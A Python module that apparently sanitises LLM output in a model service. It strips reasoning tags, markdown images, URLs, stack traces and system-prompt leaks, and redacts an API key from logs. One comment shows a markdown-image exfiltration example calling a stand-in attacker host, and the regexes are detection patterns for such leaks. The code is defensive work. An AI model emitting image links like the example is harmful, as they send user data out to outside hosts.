import logging
import re
from typing import Optional, Tuple

class SecretRedactingFormatter(logging.Formatter):
    """Logging formatter that unconditionally redacts secrets from log messages."""
    def __init__(self, fmt=None, datefmt=None, secret: Optional[str] = None):
        super().__init__(fmt, datefmt)
        self.secret = secret if (secret and len(secret) > 4) else None

    def format(self, record):
        msg = super().format(record)
        if self.secret and self.secret in msg:
            msg = msg.replace(self.secret, "[REDACTED_API_KEY]")
        return msg

# 1. Internal reasoning tags (multi-line, case-insensitive)
REASONING_TAGS_PATTERN = re.compile(
    r"<(think|thought|reasoning|scratchpad|internal)>[\s\S]*?</\1>|"
    r"<\|begin_of_thought\|>[\s\S]*?<\|end_of_thought\|>|"
    r"<(think|thought|reasoning|scratchpad|internal)>[\s\S]*$",  # unclosed tags at EOF
    re.IGNORECASE,
)

# 2. Markdown images (e.g. ![alt](https://attacker.com/leak?data=...) or ![alt][ref])
MARKDOWN_IMAGES_PATTERN = re.compile(
    r"!\[[^\]]*\]\([^\)]*\)|!\[[^\]]*\]\[[^\]]*\]",
    re.IGNORECASE,
)

# 3. URLs (HTTP, HTTPS, FTP, data URIs)
URLS_PATTERN = re.compile(
    r"(?:https?|ftp)://[^\s<>\"'`]+|data:[^;\s]+;base64,[^\s<>\"'`]+",
    re.IGNORECASE,
)

# 4. Stack traces (Python, Java, Node, generic runtime exceptions)
STACK_TRACE_PATTERNS = [
    # Python Tracebacks
    re.compile(
        r"Traceback \(most recent call last\):[\s\S]*?(?=\n\s*\n\S|\n\s*[A-Z][a-z]|\Z)",
        re.IGNORECASE,
    ),
    re.compile(r"^\s*File \"[^\"]+\", line \d+, in .*", re.MULTILINE),
    # Java Stack Traces
    re.compile(
        r"(?:Exception in thread \"[^\"]*\" [a-zA-Z0-9_.]+:.*(?:\n\s+at [a-zA-Z0-9_$]+(?:\.[a-zA-Z0-9_$]+)+.*)+)|"
        r"(?:\n\s*at [a-zA-Z0-9_$]+(?:\.[a-zA-Z0-9_$]+)+.*)+",
        re.IGNORECASE,
    ),
    # Node.js Stack Traces
    re.compile(r"^\s*at (?:[a-zA-Z0-9_$.<>\s]+)?\(?[^)\n]+:\d+:\d+\)?", re.MULTILINE),
    # Raw Exception lines
    re.compile(
        r"\b(?:RuntimeError|ValueError|TypeError|KeyError|IndexError|NameError|"
        r"AttributeError|ZeroDivisionError|AssertionError|TimeoutError|ConnectionError|"
        r"HTTPError|NullPointerException|ArrayIndexOutOfBoundsException): .*",
        re.IGNORECASE,
    ),
]

# 5. System-prompt leakage patterns
SYSTEM_PROMPT_PATTERNS = [
    # Prompt wrapper markers
    re.compile(r"<<SYS>>[\s\S]*?<</SYS>>", re.IGNORECASE),
    re.compile(r"<\|im_start\|>system[\s\S]*?<\|im_end\|>", re.IGNORECASE),
    re.compile(r"\[INST\]\s*<<SYS>>[\s\S]*?<</SYS>>\s*\[/INST\]", re.IGNORECASE),
    # System prompt headers and echoes
    re.compile(
        r"(?:^|\n)\s*(?:System|System Prompt|Internal Instructions):\s*[\s\S]*?(?=\n\s*(?:User|Assistant|Human|AI|Question):|\Z)",
        re.IGNORECASE,
    ),
    re.compile(
        r"(?:My system prompt is|My internal instructions are|I was instructed to|The system prompt specified that):?\s*.*",
        re.IGNORECASE,
    ),
    re.compile(
        r"(?:You are a helpful assistant|You are an AI assistant)\b.*?(?=\n\n|\Z)",
        re.IGNORECASE,
    ),
]


def sanitize_model_output(raw_text: str) -> Tuple[str, dict]:
    """
    Sanitizes raw LLM output before it leaves model-service.
    Strips:
      - Internal reasoning tags (<think>, etc.)
      - Markdown images (![...](...))
      - URLs (http, https, ftp, data)
      - Stack traces (Python, Java, Node, generic)
      - System-prompt leakage patterns

    Returns:
      (sanitized_text, telemetry_dict)
    """
    if not raw_text:
        return "", {"stripped_items": []}

    text = raw_text
    stripped_types = []

    # 1. Reasoning tags
    if REASONING_TAGS_PATTERN.search(text):
        text = REASONING_TAGS_PATTERN.sub("", text)
        stripped_types.append("reasoning_tags")

    # 2. Markdown images
    if MARKDOWN_IMAGES_PATTERN.search(text):
        text = MARKDOWN_IMAGES_PATTERN.sub("[IMAGE_REMOVED]", text)
        stripped_types.append("markdown_images")

    # 3. URLs
    if URLS_PATTERN.search(text):
        text = URLS_PATTERN.sub("[URL_REMOVED]", text)
        stripped_types.append("urls")

    # 4. Stack traces
    for st_pat in STACK_TRACE_PATTERNS:
        if st_pat.search(text):
            text = st_pat.sub("[STACK_TRACE_REMOVED]", text)
            stripped_types.append("stack_trace")

    # 5. System prompt leaks
    for sp_pat in SYSTEM_PROMPT_PATTERNS:
        if sp_pat.search(text):
            text = sp_pat.sub("[SYSTEM_PROMPT_FILTERED]", text)
            stripped_types.append("system_prompt_leak")

    # Clean up excess whitespace created by stripping
    text = re.sub(r"\n{3,}", "\n\n", text).strip()

    return text, {"stripped_types": list(set(stripped_types))}
